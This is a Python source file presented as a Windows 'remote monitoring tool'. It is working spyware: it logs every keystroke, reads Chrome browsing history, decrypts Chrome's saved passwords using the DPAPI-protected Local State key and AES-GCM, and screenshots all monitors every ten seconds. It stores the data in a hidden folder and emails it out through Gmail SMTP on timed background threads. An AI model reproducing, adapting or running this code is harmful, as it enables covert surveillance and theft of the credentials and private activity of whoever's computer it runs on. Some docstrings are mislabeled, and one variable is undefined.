'''
    WINDOWS remote monitoring tool written by Ravi Nayyar 2020.

    Included functionality: 
        Keylogging, updated chrome history file, decrypted chrome saved passwords,
        and usernames, and takes screenshots of every connected monitor. All data is 
        retrieved via sending an email to dummy email account
'''

import os
import os.path
import sys
import time
from time import strftime
import datetime
import threading
import logging
import getpass

#Email libraries
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

#Keylogging libraries
import shutil
import psutil
import win32com.client
from pynput.keyboard import Key, Listener, Controller

#Chrome password libraries
import json
import base64
import sqlite3
import csv
from Crypto.Cipher import AES
try:
    import win32crypt
except:
    pass

#Screenshot libraries
from desktopmagic.screengrab_win32 import saveScreenToBmp
from PIL import Image
import imagehash
import zipfile

secretFolder = os.getenv('localappdata') + '\\Setup'
if not os.path.isdir(secretFolder): 
    os.mkdir(secretFolder)

currLogFilePath = secretFolder + "\\currLogFile.txt"
totalLogFilePath = secretFolder + "\\totalLogFile.txt"
errorLogFilePath = secretFolder + "\\errorLogFile.txt"
historyLogFilePath = secretFolder + "\\historyLogFile.txt"
chromePasswordCsvPath = secretFolder + "\\chromePasswords.csv"

lastScreenShot = None
screenshotZipFile = None

oldTime = datetime.datetime(1,1,1)

emailTimeDiff = 3600*5 #5 hours
email = '<Enter Email Address>'
password = '<Enter Email Password>'


'''
    Name: writeLog
    Desc: 
        Writes a given message to the log file
    Inputs:
        log:  the name of the log file to write to
        msg:  the content of the message
        crlf: end of the line character
'''
def writeLog(log, msg, crlf):
    try:
        f = open(log, "a")
        f.write(msg+crlf)
        f.close()
    except Exception as e:
        writeLog(errorLogFilePath, str(e), "\n")

'''
    Name: getChromeHistory
    Desc: 
        emails the txt file containing keystrokes every 2 hours
        and then deletes the file
'''
def sendKeylogData():
    while(True):
        try:
            time.sleep(3600*2)    
            sendEmailWithAttachment(str(getpass.getuser())+"-Keylog Data", currLogFilePath)
            os.remove(currLogFilePath)
        except Exception as e:
            writeLog(errorLogFilePath, str(e), "\n")


'''
    Name: keylog
    Desc: 
        Captures any keystrokes either pressed and released by the user 
'''
def keylog():
    def on_press(key):
        writeLog(currLogFilePath, '{} | {} pressed \n'.format(datetime.datetime.now(), key),"")

    def on_release(key):
        writeLog(currLogFilePath, '{} | {} released \n'.format(datetime.datetime.now(), key),"")
    
    # Collect events until released
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


'''
    Name: getpath
    Desc: 
        Verifies and returns a valid file path in the path
        localappdata\\Google\\Chrome\\User Data\\Default\\'<fileName>
    Inputs:
        fileName: the name of the file
    Outputs:
        The entire file path as shown in the description
'''
def getpath(fileName):
    '''Verifies OS is windows and returns the location of the chrome saved passwords file'''
    if os.name == "nt":
        # This is the Windows Path
        pathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'+fileName
    if not os.path.isfile(pathName):
        writeLog(errorLogFilePath, '[!] {} does not exist'.format(pathName), "\n")
        return False

    return pathName


'''
    Name: getChromeHistory
    Desc: 
        Calls the getChromeHistory function, emails
        the txt file containing the time, title, and urls retrieved, and then 
        deletes the csv file every 5 hours
'''
def getChromeHistory():
    while(True):
        #parses the history file every 5 hours
        parseHistoryFile()
        sendEmailWithAttachment(str(getpass.getuser())+"-Chrome History File", historyLogFilePath)
        os.remove(historyLogFilePath)
        time.sleep(emailTimeDiff)


'''
    Name: parseHistoryFile
    Desc: 
        Connects to the Chrome history database file, retrieves the 
        last visit time, title, and url, and then writes the data to 
        a log file  
'''
def parseHistoryFile():
    global oldTime
    path = getpath("History")

    #verifies History path
    if (path == False):
        writeLog(errorLogFile, "{} not found".format(path), "\n")
    
    #creating copy of the history file to prevent a chrome database lock
    origFile = r''+path+''
    targetFile = r''+path+'2'
    shutil.copyfile(origFile, targetFile)

    try:
        #connects to the copy file
        con = sqlite3.connect(targetFile)
        cur = con.cursor()

        #obtains the time acessed, title, and url fields from the urls table
        cur.execute('SELECT datetime(last_visit_time / 1000000 + (strftime(\'%s\', \'1601-01-01\')), \'unixepoch\'), title, url FROM urls ORDER BY last_visit_time ASC')
        rows = cur.fetchall()

        #appends any new websites searched to the log file
        f = open(historyLogFilePath, "a")
        for r in rows:
            time, title, url = r
            data = "{}, {}, {}\n".format(time, title, url)           
            date_time_obj = datetime.datetime.strptime(time, '%Y-%m-%d %H:%M:%S')
            if (date_time_obj > oldTime):
                oldTime = date_time_obj
                try:
                    f.write(data)
                except Exception as e:
                    pass

        f.close()
        con.close()
        os.remove(targetFile)
    
    except Exception as e:
        writeLog(errorLogFilePath, str(e), "\n")


'''
    Name: zipPhotos
    Desc:
        Takes a screenshot, compresses it, and stores it in a zip file.
        Once the zip file is larger than 15 mbs, the file is emailed.
    Inputs:
        filename: the .png screenshot
'''
def zipPhotos(filename):
    global screenshotZip
    #openining the zip file
    zipFilePath = secretFolder+"\\screenshot.zip"
    screenshotZip = zipfile.ZipFile(zipFilePath, 'w')
    
    #compressing the screenshot and storing within the zip file
    screenshotZip.write(filename, compress_type=zipfile.ZIP_DEFLATED)
    
    #Calculating size of file in megabytes
    zipSize = int(os.path.getsize(zipFilePath))/1000000
    if zipSize > 15:
        sendEmailWithAttachment("Screenshot Zip", 'screenshot.zip')
        screenshotZip.close()
        os.remove(zipFilePath)
        screenshotZip = zipfile.ZipFile(zipFilePath, 'w')


'''
    Name: getChromeHistory
    Desc: 
        Takes a collective screenshot of every monitor every 
        10 seconds and compares the current image to the last image taken.
        Current image is deleted if too similar to the previous image
'''
def getScreenShot():
    global lastScreenShot

    while(True):
        time.sleep(10)

        #creating valid screenshot name by appending the user name with the date/time
        dt = str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        year_str = dt[0:dt.index(" ")]
        time_str = dt[dt.index(" ")+1:]
        name = (getpass.getuser()+"-"+str(year_str)+"_"+str(time_str)+".png").replace(":", "-")
        name = secretFolder + "\\"+name

        #taking the collective screenshot
        saveScreenToBmp(name)

        #Deleting current screenshot if too similar to the previous image
        if lastScreenShot is not None:
            lastScreenShotHash = imagehash.average_hash(Image.open(lastScreenShot))
            currentScreenShotHash = imagehash.average_hash(Image.open(name))
            imageDiff = lastScreenShotHash - currentScreenShotHash 
            if imageDiff <= 2:
                os.remove(name)
                continue
        
            os.remove(lastScreenShot)
        
        lastScreenShot = name
        zipPhotos(name)

            
'''
    Name: password_csv
    Desc: 
        Appends chrome password data to a csv 
    Inputs:
        info: list that contains the url, username and password data
'''
def password_csv(info):
    try:
        with open(chromePasswordCsvPath, 'wb') as csv_file:
            csv_file.write('origin_url,username,password \n'.encode('utf-8'))
            for data in info:
                csv_file.write(('%s, %s, %s \n' % (data['origin_url'], data['username'], data['password'])).encode('utf-8'))
    except EnvironmentError:
        writeLog(errorLogFilePath, 'EnvironmentError: cannot write data', "\n")


'''
    Name: getKey
    Desc: 
        Gets the local state file and extracts and decrypts the local key
'''
def getKey():
    path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Local State'
    with open(path, 'r') as file:
        encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
        encrypted_key = base64.b64decode(encrypted_key)[5:]
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key


'''
    Name: decrypt_password
    Desc: 
        Decrypts the given data using the given key
    Inputs:
        encrypted_data: the data that will be decrypted
        local_key: key that is used to decrypt the data
    Outputs:
        Returns the plain text data or False if the data cannot be
        decrypted
'''
def decrypt_password(encrypted_data, local_key):
    try:
        init_vector = encrypted_data[3:15]
        payload = encrypted_data[15:]
        cipher = AES.new(local_key, AES.MODE_GCM, init_vector)
        decrypted_data = cipher.decrypt(payload)[:-16].decode()
        return decrypted_data
    except Exception as e:
        writeLog(errorLogFilePath, str(e), "\n")
        return False


'''
    Name: getChromeHistory
    Desc: 
        Calls the parseChromePasswordFile function, emails
        the csv containing the urls, usernames and passwords retrieved, and 
        deletes the csv file every 5 hours
'''
def getChromePasswords():
    while(True):
        parseChromePasswordFile()
        sendEmailWithAttachment(str(getpass.getuser())+"-Chrome Password Saved List", chromePasswordCsvPath)
        os.remove(chromePasswordCsvPath)
        time.sleep(emailTimeDiff)


'''
    Name: parseChromePasswordFile
    Desc: 
        Connects to the Chrome 'Login Data' database file, retrieves the 
        url, username, and password information, and saves the data in a csv
'''
def parseChromePasswordFile():
    un_pswd_list = []
    path = getpath("Login Data")
    
    #creating copy of the Login Data file to prevent a chrome database lock
    origFile = r''+path+''
    targetFile = r''+path+'2'
    shutil.copyfile(origFile, targetFile)
    
    try:
        #connects to the copy file
        connection = sqlite3.connect(targetFile)
        with connection:
            cursor = connection.cursor()
            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

            #obtains the time acessed, title, and url fields from the urls table
            for origin_url, username, password in value:
                if os.name == 'nt':
                    decrypted_password = decrypt_password(password, getKey())
                    if decrypted_password:
                        un_pswd_list.append({'origin_url': origin_url, 'username': username, 'password': str(decrypted_password)})
            password_csv(un_pswd_list)

    except sqlite3.OperationalError as e:
        writeLog(errorLogFilePath, str(e), "\n")


'''
    Name: sendEmailWithAttachment
    Desc: 
        Sends an email to the account specified with an attachment
    Input:
        subjectLine: The subject line of the email
        fileLocation: The path of the file which will be sent as an attachment
'''
def sendEmailWithAttachment(subjectLine, fileLocation):   
    message = subjectLine
    msg = MIMEMultipart()
    
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = subjectLine

    msg.attach(MIMEText(message, 'plain'))
    filename = os.path.basename(fileLocation)
    attachment = open(fileLocation, "rb")
    
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    text = msg.as_string()
    
    server.sendmail(email, email, text)
    server.quit()


def main():
    '''
    Starting threads for the keylogging, keylog retrieval, chrome history, chrome passwords,
    and screenshot functions
    '''
    
    keylogThread = threading.Thread(target=keylog)
    keylogThread.start()

    keylogRetrievalThread = threading.Thread(target=sendKeylogData)
    keylogRetrievalThread.start()
    
    historyThread = threading.Thread(target=getChromeHistory)
    historyThread.start()

    passwordsThread = threading.Thread(target=getChromePasswords)
    passwordsThread.start()
    
    screenshotThread = threading.Thread(target=getScreenShot)
    screenshotThread.start()


if __name__ == '__main__':
    main()
